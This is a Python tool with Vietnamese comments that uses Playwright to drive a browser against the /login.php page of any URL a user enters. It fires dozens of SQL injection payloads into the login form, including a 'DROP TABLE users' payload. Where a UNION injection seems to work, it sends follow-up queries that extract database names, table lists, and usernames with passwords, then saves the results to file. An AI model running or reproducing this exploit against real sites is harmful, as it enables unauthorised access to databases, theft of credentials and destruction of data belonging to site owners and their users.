import time
import signal
import sys
import logging
import random
from playwright.sync_api import sync_playwright, Playwright
from playwright._impl._errors import TimeoutError

# Thiết lập logging
logging.basicConfig(filename='sqli_exploit.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Danh sách các payload SQLi mở rộng (lấy cảm hứng từ SecLists và các nguồn phổ biến)
SQLI_PAYLOADS = [
    # Generic SQLi Payloads
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR 1=1 --",
    "1' AND 1=1 --", "1' AND 1=2 --", "' OR 'a'='a", "' OR 'a'='a' --",
    "admin' --", "admin' #", "admin'/*", "' OR ''='", "' OR 1=1/*",
    "' OR 1=1 LIMIT 1 --", "' OR 1=1 ORDER BY 1 --", "' OR 1=1 UNION SELECT 1 --",
    "' AND 1=2 UNION SELECT 1,2 --", "' AND 1=2 UNION SELECT 1,2,3 --",
    "' OR '1'='1' AND '1'='1", "' OR '1'='1' AND SLEEP(5) --",

    # Union-based SQLi Payloads
    "' UNION SELECT NULL --", "' UNION SELECT NULL, NULL --", "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT 1,2 --", "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4 --",
    "' UNION SELECT @@version, NULL --", "' UNION SELECT user(), NULL --",
    "' UNION SELECT database(), NULL --", "' UNION SELECT schema_name, NULL FROM information_schema.schemata --",
    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    "' UNION SELECT column_name, NULL FROM information_schema.columns --",

    # Error-based SQLi Payloads
    "1' AND 1=CONVERT(int, (SELECT @@version)) --",
    "1' AND 1=CAST((SELECT @@version) AS int) --",
    "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
    "1' AND 1=EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
    "1' AND 1=UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1) --",
    "' AND 1=2 OR 1=EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",

    # Time-based SQLi Payloads
    "1' AND SLEEP(5) --", "1' AND IF(1=1, SLEEP(5), 0) --",
    "1' AND (SELECT 1 FROM dual WHERE SLEEP(5)) --", "1' AND BENCHMARK(5000000, MD5(1)) --",
    "1' AND IF(1=1, BENCHMARK(5000000, MD5(1)), 0) --", "' OR SLEEP(5) --",
    "' OR IF(1=1, SLEEP(5), 0) --", "' OR (SELECT 1 FROM dual WHERE SLEEP(5)) --",

    # Blind SQLi Payloads (Boolean-based)
    "1' AND 1=1 --", "1' AND 1=2 --", "' AND SUBSTRING((SELECT @@version), 1, 1)='5' --",
    "' AND (SELECT LENGTH(database()))=7 --", "' AND (SELECT SUBSTRING((SELECT database()), 1, 1))='v' --",
    "' AND (SELECT ASCII(SUBSTRING((SELECT database()), 1, 1)))=118 --",
    "' AND 1=(SELECT IF(1=1, 1, 0)) --", "' AND 1=(SELECT IF(1=2, 1, 0)) --",

    # Additional Payloads (lấy cảm hứng từ SecLists)
    "1; DROP TABLE users --", "1' OR EXISTS(SELECT * FROM users) --",
    "1' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --",
    "' OR (SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1)=1 --",
    "1' OR (SELECT 1 FROM dual WHERE database() LIKE 'v%') --",
    "' OR (SELECT 1 FROM information_schema.columns WHERE table_name='users')=1 --",
    "' OR 1=(SELECT 1 FROM information_schema.tables WHERE table_schema='mysql') --",
    "1' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_schema='mysql' AND table_name='user') --",
]

# Danh sách các payload khai thác Union-based SQLi (mở rộng)
UNION_PAYLOADS = [
    "UNION SELECT database(), NULL --",  # Lấy tên database
    "UNION SELECT user(), NULL --",  # Lấy user hiện tại
    "UNION SELECT @@version, NULL --",  # Lấy phiên bản MySQL
    "UNION SELECT schema_name, NULL FROM information_schema.schemata --",  # Lấy danh sách schema
    "UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --",  # Lấy danh sách bảng
    "UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='mysql' --",  # Lấy bảng từ schema 'mysql'
    "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --",  # Lấy danh sách cột của bảng users
    "UNION SELECT username, password FROM users --",  # Lấy dữ liệu từ bảng users
    "UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --",  # Lấy bảng và cột
    "UNION SELECT group_concat(table_name), NULL FROM information_schema.tables WHERE table_schema=database() --",  # Lấy tất cả bảng
    "UNION SELECT group_concat(column_name), NULL FROM information_schema.columns WHERE table_name='users' --",  # Lấy tất cả cột
    "UNION SELECT group_concat(username, ':', password), NULL FROM users --",  # Lấy username và password
]

# Biến toàn cục để theo dõi trạng thái quét
stop_scanning = False
results_found = []

# Xử lý tín hiệu dừng (Ctrl+C)
def signal_handler(sig, frame):
    global stop_scanning
    print("\n[!] Stopping scan...")
    stop_scanning = True
    if results_found:
        with open("sqli_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Kiểm tra phản hồi để phát hiện lỗ hổng SQLi
def check_sqli_response(response_text, original_response_text):
    # Kiểm tra các dấu hiệu lỗi SQL
    error_indicators = [
        "mysql_fetch", "SQL syntax", "You have an error in your SQL syntax",
        "mysql_num_rows", "sql error", "unexpected end of SQL",
        "ODBC SQL Server Driver", "SQL Server", "Microsoft OLE DB Provider",
        "SQLSTATE", "unclosed quotation mark", "incorrect syntax"
    ]
    for indicator in error_indicators:
        if indicator.lower() in response_text.lower():
            return True, "Error-based SQLi detected"

    # Kiểm tra sự khác biệt trong phản hồi (so với phản hồi gốc)
    if response_text != original_response_text:
        return True, "Potential SQLi detected (response differs)"

    # Kiểm tra các từ khóa liên quan đến dữ liệu rò rỉ (cho Union-based)
    data_leak_indicators = ["database()", "information_schema", "users", "admin", "mysql", "schema_name", "table_name", "column_name"]
    for indicator in data_leak_indicators:
        if indicator.lower() in response_text.lower():
            return True, "Union-based SQLi detected"

    return False, None

# Tự động khai thác SQLi bằng Playwright
def auto_exploit_sqli(playwright: Playwright, login_url, max_retries=3):
    global stop_scanning
    browser = None
    try:
        browser = playwright.chromium.launch(headless=False)  # Mở Chrome để quan sát
        context = browser.new_context(
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 720}
        )
        for attempt in range(max_retries):
            try:
                page = context.new_page()

                # 1. Lấy phản hồi gốc để so sánh
                print(f"[*] Opening Chrome to login at {login_url} (Attempt {attempt + 1}/{max_retries})...")
                page.goto(login_url)

                # Điền dữ liệu gốc (không chứa payload SQLi)
                print("[*] Entering original data for baseline comparison...")
                page.wait_for_selector("input[name='uname']", timeout=60000)
                page.fill("input[name='uname']", "test")
                time.sleep(1)  # Delay 1 giây
                page.wait_for_selector("input[name='pass']", timeout=60000)
                page.fill("input[name='pass']", "test")
                time.sleep(1)  # Delay 1 giây
                page.wait_for_selector("input[type='submit']", timeout=60000)
                page.click("input[type='submit']")
                time.sleep(2)  # Delay 2 giây để chờ phản hồi
                original_response_text = page.content()

                # 2. Kiểm tra từng payload SQLi
                for payload in SQLI_PAYLOADS:
                    if stop_scanning:
                        break
                    print(f"[*] Testing SQLi payload: {payload}")

                    # Tải lại trang để nhập payload mới
                    page.goto(login_url)

                    # Điền payload SQLi vào form đăng nhập (chậm rãi)
                    print("[*] Entering username...")
                    page.wait_for_selector("input[name='uname']", timeout=60000)
                    page.fill("input[name='uname']", payload)
                    time.sleep(1)  # Delay 1 giây
                    print("[*] Entering password...")
                    page.wait_for_selector("input[name='pass']", timeout=60000)
                    page.fill("input[name='pass']", payload)
                    time.sleep(1)  # Delay 1 giây
                    print("[*] Clicking login button...")
                    page.wait_for_selector("input[type='submit']", timeout=60000)
                    page.click("input[type='submit']")
                    time.sleep(2)  # Delay 2 giây để chờ phản hồi

                    # Kiểm tra phản hồi
                    response_text = page.content()
                    is_vulnerable, vuln_type = check_sqli_response(response_text, original_response_text)
                    if is_vulnerable:
                        result = f"[!!!] SQLi Vulnerability Found!\nPayload: {payload}\nType: {vuln_type}\nURL: {login_url}"
                        print(result)
                        logging.info(result)
                        results_found.append(result)

                        # Nếu phát hiện Union-based SQLi, thử khai thác
                        if "Union-based" in vuln_type:
                            exploit_sqli_union(page, login_url, payload)
                        stop_scanning = True
                        return True

            except TimeoutError as e:
                print(f"[!] Timeout during login/exploitation (Attempt {attempt + 1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    print("[*] Retrying...")
                    if page:
                        page.close()
                    continue
                print(f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)")
                result = f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)."
                print(result)
                results_found.append(result)
                logging.info(result)
                stop_scanning = True
                return False
            except Exception as e:
                print(f"[!] Error during login/exploitation (Attempt {attempt + 1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    print("[*] Retrying...")
                    if page:
                        page.close()
                    continue
                print(f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)")
                result = f"[!!!] SQLi may exist but could not be confirmed at {login_url} (check manually)."
                print(result)
                results_found.append(result)
                logging.info(result)
                stop_scanning = True
                return False

        return False  # Nếu không thành công sau tất cả các lần thử

    finally:
        if browser:
            print("[*] Closing Chrome browser...")
            browser.close()

# Khai thác Union-based SQLi
def exploit_sqli_union(page, login_url, base_payload):
    print("[*] Attempting to exploit Union-based SQLi...")
    for exploit_payload in UNION_PAYLOADS:
        payload = f"{base_payload.split('UNION')[0]} {exploit_payload}"
        print(f"[*] Exploiting with payload: {payload}")

        # Tải lại trang để nhập payload khai thác
        page.goto(login_url)

        # Điền payload khai thác (chậm rãi)
        print("[*] Entering username...")
        page.wait_for_selector("input[name='uname']", timeout=60000)
        page.fill("input[name='uname']", payload)
        time.sleep(1)  # Delay 1 giây
        print("[*] Entering password...")
        page.wait_for_selector("input[name='pass']", timeout=60000)
        page.fill("input[name='pass']", payload)
        time.sleep(1)  # Delay 1 giây
        print("[*] Clicking login button...")
        page.wait_for_selector("input[type='submit']", timeout=60000)
        page.click("input[type='submit']")
        time.sleep(2)  # Delay 2 giây để chờ phản hồi

        # Kiểm tra dữ liệu rò rỉ trong phản hồi
        response_text = page.content().lower()
        data_leak_indicators = ["database()", "information_schema", "users", "admin", "mysql", "schema_name", "table_name", "column_name"]
        for indicator in data_leak_indicators:
            if indicator.lower() in response_text:
                result = f"[!!!] Data Extracted!\nPayload: {payload}\nResponse: {response_text[:500]}..."
                print(result)
                logging.info(result)
                with open("sqli_results.txt", "a") as f:
                    f.write(result + "\n")
                break

# Hàm chính để quét SQLi
def scan_sqli(url, max_time=600):
    global stop_scanning
    start_time = time.time()
    print(f"\n[*] Scanning for SQL Injection on {url} (Max time: {max_time} seconds)")

    # Chỉ quét trên login.php
    login_url = f"{url.rstrip('/')}/login.php"

    # Sử dụng Playwright để tự động quét
    with sync_playwright() as playwright:
        if auto_exploit_sqli(playwright, login_url):
            print("[*] SQLi exploitation completed.")

    if results_found:
        with open("sqli_results.txt", "a") as f:
            for result in results_found:
                f.write(result + "\n")

# Hàm quét SQLi và hiển thị menu
def scan_sqli_and_continue():
    while True:
        stop_scanning = False  # Reset trạng thái quét
        results_found.clear()  # Reset danh sách kết quả

        target_url = input("Enter target URL to scan for SQLi (e.g., http://example.com/): ")
        scan_sqli(target_url)

        # Hiển thị menu hỏi người dùng
        print("\nScan completed!")
        print("Would you like to continue scanning another URL or exit?")
        print("1. Scan another URL")
        print("2. Exit")
        choice = input("Enter your choice (1 or 2): ")

        if choice == "1":
            continue  # Tiếp tục vòng lặp để quét URL mới
        elif choice == "2":
            print("[*] Exiting program...")
            sys.exit(0)  # Thoát chương trình
        else:
            print("[!] Invalid choice. Exiting program...")
            sys.exit(0)

# Chạy chương trình
if __name__ == "__main__":
    print("=== SQL Injection Scanner (Playwright Automation with Extended Payloads) ===")
    scan_sqli_and_continue()